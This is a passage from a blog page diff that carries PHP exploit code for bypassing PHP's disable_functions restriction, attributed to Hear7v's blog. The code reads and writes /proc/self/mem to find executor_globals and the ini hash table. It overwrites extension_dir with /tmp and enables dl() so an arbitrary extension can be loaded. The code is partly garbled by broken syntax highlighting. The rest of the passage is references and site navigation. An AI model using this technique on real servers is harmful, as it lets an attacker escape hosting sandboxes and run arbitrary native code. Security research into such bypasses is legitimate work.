class="variable">$mem</span>, <span class="number">8</span>);</span><br><span class="line">printf(<span class="string">"ini_directives address maybe in 0x%016x\r\n"</span>, <span class="variable">$ini_dir</span>); fseek(<span class="variable">$mem</span>, <span class="variable">$ini_dir</span> + <span class="number">48</span>); <span class="comment">//seek to Bucket **arBuckets;</span></span><br><span class="line"><span class="variable">$arBucket</span> = dump_value(<span class="variable">$mem</span>, <span class="number">8</span>);</span><br><span class="line">printf(<span class="string">"Bucket **arBuckets address maybe in 0x%016x\r\n"</span>, <span class="variable">$arBucket</span>); fseek(<span class="variable">$mem</span>, <span class="variable">$arBucket</span>);</span><br><span class="line"><span class="comment">//try to get the first Bucket address</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">1000</span>;<span class="variable">$i</span> ++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$bucket</span> = dump_value(<span class="variable">$mem</span>, <span class="number">8</span>);</span><br><span class="line"><span class="comment">//printf("This bucket address maybe in 0x%016x\r\n", $bucket); fseek($mem, $bucket + 16); //seek to const void *pData; in struct</span></span><br><span class="line">Bucket</span><br><span class="line"><span class="variable">$pdata</span> = dump_value(<span class="variable">$mem</span>, <span class="number">8</span>);</span><br><span class="line">dump_value(<span class="variable">$mem</span>, <span class="number">8</span>);</span><br><span class="line"><span class="comment">//printf("This pData address maybe in 0x%016x\r\n", $pdata);</span></span><br><span class="line">fseek(<span class="variable">$mem</span>, <span class="variable">$pdata</span> + <span class="number">8</span>); <span class="comment">//seek to char* name; $name = dump_value($mem, 8);</span></span><br><span class="line"><span class="variable">$name_t</span> = dump_value(<span class="variable">$mem</span>, <span class="number">4</span>);</span><br><span class="line"><span class="comment">//printf("This char name* address maybe in 0x%016x,</span></span><br><span class="line">length:%d\r\n<span class="string">", $name, $name_t); fseek($mem, $name);</span><br><span class="line">$strname = fread($mem, $name_t); if(strlen($strname) == 0) break;</span><br><span class="line">//printf("</span>ini key:%s\r\n<span class="string">", $strname); if(strncmp($strname, 'extension_dir', 13) == 0) &#123;</span><br><span class="line">printf("</span>I found the extension_dir offset!\r\n<span class="string">");</span><br><span class="line">printf("</span><span class="keyword">try</span> to set extension_dir value /tmp by ini_set\r\n<span class="string">"); ini_set('extension_dir', '/tmp');</span><br><span class="line">printf("</span><span class="keyword">try</span> to get extension_dir value by ini_get\r\n<span class="string">"); var_dump(ini_get('extension_dir'));</span><br><span class="line">// write string value</span><br><span class="line">fseek($mem, $pdata + 56); //seek to char* value; $value = dump_value($mem, 8);</span><br><span class="line">$value_t = dump_value($mem, 4);</span><br><span class="line">printf("</span>This char value* address maybe in <span class="number">0</span>x%<span class="number">016</span>x,</span><br><span class="line">length:%d\r\n<span class="string">", $value, $value_t);</span><br><span class="line">// write data part</span><br><span class="line">$mem_w = fopen("</span>/proc/<span class="keyword">self</span>/mem<span class="string">", "</span>w<span class="string">b"); fseek($mem_w, $value);</span><br><span class="line">fwrite($mem_w, "</span>/tmp\<span class="number">0</span><span class="string">", 5); //write /tmp value printf("</span>retry to get extension_dir value!!!!\r\n<span class="string">"); var_dump(ini_get('extension_dir'));</span><br><span class="line">error_reporting(0x66778899);</span><br><span class="line">break; &#125;</span><br><span class="line">//seek to struct bucket *pListNext; ready to read next bucket's</span><br><span class="line">address</span><br><span class="line">strage!</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">error_reporting(0x66778899); &#125;</span><br><span class="line">&#125; &#125;</span><br><span class="line">//set the enable_dl</span><br><span class="line">fseek($mem, 0x00ea1000);</span><br><span class="line">for($i = 0;$i &lt; 0x00ebe000 - 0x00ea1000;$i += 4) &#123;</span><br><span class="line">$num = unp(fread($mem, 4)); if($num == 0x66778899)</span><br><span class="line">&#123;</span><br><span class="line">$offset = 0x00ea1000 + $i;</span><br><span class="line">printf("</span>got noe, offset is:<span class="number">0</span>x%x\r\n<span class="string">", $offset);</span><br><span class="line">fseek($mem, $bucket + 32 + 8);//struct bucket *pListLast;</span><br><span class="line">it's so</span><br><span class="line">printf("</span>now here, restore the value\r\n<span class="string">");</span><br><span class="line">Bucket</span><br><span class="line">printf("</span>Now set error_reporting to <span class="number">0x55667788</span> <span class="keyword">and</span> reread the value\r\n<span class="string">"); error_reporting(0x55667788);</span><br><span class="line">fseek($mem, $offset);</span><br><span class="line">$num = unp(fread($mem, 4));</span><br><span class="line">printf("</span>The value is %x\r\n<span class="string">", $num); if($num == 0x55667788)</span><br><span class="line">&#123;</span><br><span class="line">printf("</span>I found the offset of executor_globals<span class="string">'s member error_reporting\r\n");</span><br><span class="line">printf("read the structure\r\n");</span><br><span class="line">fseek($mem, $offset);</span><br><span class="line">fseek($mem, $offset + 392 - 8); //seek to int timeout_seconds member $timeout = dump_value($mem, 4);</span><br><span class="line">if($timeout == 0x41424344)</span><br><span class="line">&#123;</span><br><span class="line">error_reporting(E_ALL); //restore the error reporting</span><br><span class="line">printf("I found the timeout_seconds I seted:0x%08x\r\n", $timeout); dump_value($mem, 4);</span><br><span class="line">$ini_dir = dump_value($mem, 8);</span><br><span class="line">printf("ini_directives address maybe in 0x%016x\r\n", $ini_dir); fseek($mem, $ini_dir + 48); //seek to Bucket **arBuckets;</span><br><span class="line">$arBucket = dump_value($mem, 8);</span><br><span class="line">printf("Bucket **arBuckets address maybe in 0x%016x\r\n", $arBucket); fseek($mem, $arBucket);</span><br><span class="line">//try to get the first Bucket address</span><br><span class="line">for($i = 0;$i &lt; 1000;$i ++)</span><br><span class="line">&#123;</span><br><span class="line">$bucket = dump_value($mem, 8);</span><br><span class="line">//printf("This bucket address maybe in 0x%016x\r\n", $bucket); fseek($mem, $bucket + 16); //seek to const void *pData; in struct</span><br><span class="line">$pdata = dump_value($mem, 8); dump_value($mem, 8);</span><br><span class="line">//printf("This pData address maybe in 0x%016x\r\n", $pdata);</span><br><span class="line">fseek($mem, $pdata + 8); //seek to char* name; $name = dump_value($mem, 8);</span><br><span class="line">$name_t = dump_value($mem, 4);</span><br><span class="line">//printf("This char name* address maybe in 0x%016x,</span><br><span class="line">length:%d\r\n", $name, $name_t); fseek($mem, $name);</span><br><span class="line">$strname = fread($mem, $name_t); if(strlen($strname) == 0) break; //printf("ini key:%s\r\n", $strname); if(strncmp($strname, '</span>enable_dl<span class="string">', 9) == 0) &#123;</span><br><span class="line">printf("I found the enable_dl offset!\r\n");</span><br><span class="line">printf("try to set enable_dl value true by ini_set\r\n"); ini_set('</span>enable_dl<span class="string">', true);</span><br><span class="line">printf("try to get enable_dl value by ini_get\r\n"); var_dump(ini_get('</span>enable_dl<span class="string">'));</span><br><span class="line">printf("try to run dl() function\r\n"); dl('</span>not_exists<span class="string">');</span><br><span class="line">printf("try to modifiy the modifiable member in memory!\r\n"); fseek($mem, $pdata + 4);</span><br><span class="line">$mo</span></span><br></pre></td></tr></table></figure>
+<p>##Reference </p>
+<p><a href="https://rdot.org/forum/showthread.php?t=3309" target="_blank" rel="external">https://rdot.org/forum/showthread.php?t=3309</a></p>
+<p><a href="http://www.blackhat.com/presentations/bh-usa-09/ESSER/BHUSA09-Esser-PostExploitatio" target="_blank" rel="external">http://www.blackhat.com/presentations/bh-usa-09/ESSER/BHUSA09-Esser-PostExploitatio</a> nPHP-SLIDES.pdf</p>
+<p><a href="http://www.freebuf.com/articles/web/82801.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/82801.html</a></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/php/">php</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/bypass/">bypass</a><a href="/tags/disable-functions/">disable_functions</a><a href="/tags/php/">php</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://yoursite.com/2015/10/31/利用zend-executor-globals-绕过disable-functions/" data-title="利用zend_executor_globals 绕过disable_functions | Hear7v&#39;s Blog" data-tsina="null" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2015/11/16/通过一道Crypto对rsa的学习/" title="通过一道Crypto对rsa的学习">
+  <strong>上一篇：</strong><br/>
+  <span>
+  通过一道Crypto对rsa的学习</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2015/10/29/360SkyWolf视频-phpcmsv9-0day分析/"  title="360SkyWolf视频_phpcmsv9_0day分析">
+ <strong>下一篇：</strong><br/> 
+ <span>360SkyWolf视频_phpcmsv9_0day分析
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="顯示側邊欄"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目錄</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Overview"><span class="toc-number">1.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Test_environment"><span class="toc-number">2.</span> <span class="toc-text">Test environment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Why_is_sl()?"><span class="toc-number">3.</span> <span class="toc-text">Why is sl()?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Research_structures"><span class="toc-number">4.</span> <span class="toc-text">Research structures</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05_Search_for_options"><span class="toc-number">5.</span> <span class="toc-text">0x05 Search for options</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06_final"><span class="toc-number">6.</span> <span class="toc-text">0x06 final</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#code"><span class="toc-number">7.</span> <span class="toc-text">code</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隱藏側邊欄"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分類</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/crypto/" title="crypto">crypto<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/linux/" title="linux">linux<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/misc/" title="misc">misc<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/pentest/" title="pentest">pentest<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/php/" title="php">php<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/python/" title="python">python<sup>5</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/web/" title="web">web<sup>5</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/被动sql注入检测框架折腾/" title="被动sql注入检测框架折腾">被动sql注入检测框架折腾<sup>2</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">標簽</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/python/" title="python">python<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/sqli/" title="sqli">sqli<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/exp/" title="exp">exp<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/phpcms/" title="phpcms">phpcms<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/漏洞挖掘/" title="漏洞挖掘">漏洞挖掘<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/linux/" title="linux">linux<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ssrf/" title="ssrf">ssrf<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/内网/" title="内网">内网<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/渗透/" title="渗透">渗透<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/object/" title="object">object<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/disable-functions/" title="disable_functions">disable_functions<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php/" title="php">php<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/文件包含/" title="文件包含">文件包含<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/header/" title="header">header<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/insert/" title="insert">insert<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/mysql/" title="mysql">mysql<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/project/" title="project">project<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/bypass/" title="bypass">bypass<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/moudle/" title="moudle">moudle<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情鏈接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.lynahex.com/" target="_blank" title="lynahex&#39;s Blog">lynahex&#39;s Blog</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 訂閱</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">新浪微博</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=null&verifier=&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> honesty and integrity surprisingly. <br/>
+			null</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2016 
+		
+		<a href="/about" target="_blank" title="Hear7v">Hear7v</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fe6d1f421bbc9962127a50488f9ed37d1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回頂部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
